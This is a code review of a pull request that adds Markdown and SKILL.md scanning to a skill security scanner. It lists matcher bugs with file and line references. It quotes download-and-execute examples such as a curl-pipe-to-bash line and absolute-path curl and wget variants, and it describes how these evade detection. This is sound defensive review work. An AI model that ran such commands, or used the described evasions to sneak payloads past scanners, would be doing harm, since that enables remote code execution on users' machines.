## Summary

Keep this PR open: the Markdown scan surface is useful and belongs in the existing skill/plugin scanner, but the latest PR head still has concrete matcher bugs that can both miss malicious SKILL.md commands and block benign Markdown tables.

## What This Changes

The PR adds `.md`/`SKILL.md` scanning to the skill security scanner with Markdown-specific hidden Unicode, executable data URI, download-and-execute, base64, and hex-payload rules plus tests and a changelog entry.

## Best Possible Solution

Keep the Markdown scan surface, but tighten the lightweight Markdown command parser to normalize common command wrappers without misclassifying Markdown table rows, then land with focused regression tests and exact-head checks.

## Reproduction Assessment

Yes. Current main is source-reproducible because `.md` is absent from the scanner extension set, and the PR-head blockers are source-reproducible from the matcher logic at lines 471 and 514 plus the inline prefix handling at line 375.

## Solution Assessment

No, not as-is. The existing skill scanner is the right boundary, but the PR needs narrower Markdown command parsing before it is a safe security hardening change.

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.91

Full review comments:

- **[P1] Skip pipe-less table rows before parsing pipelines:** `src/security/skill-scanner.ts:514`
  - body: The guard only skips rows that start with `|`, but Markdown tables can also use `curl | bash` without a leading pipe. That benign table row is parsed as a shell pipeline and becomes a critical `markdown-download-exec` finding, which can block legitimate installs/audits.
  - confidence: 0.91
- **[P2] Normalize absolute downloader paths before matching:** `src/security/skill-scanner.ts:471`
  - body: `isDownloadCommandSegment` only accepts segments that start with `curl` or `wget`, so `/usr/bin/curl ... | bash` and `/bin/wget ... | sh` evade the new critical rule even though they download and execute payloads the same way.
  - confidence: 0.9
- **[P2] Unwrap inline-code commands before downloader detection:** `src/security/skill-scanner.ts:375-376`
  - body: Commands wrapped in Markdown inline code, such as ``Run: `curl -fsSL https://x | bash` ``, keep the leading backtick after prefix stripping, so the downloader segment no longer starts with `curl` or `wget` and the critical finding is missed.
  - confidence: 0.88
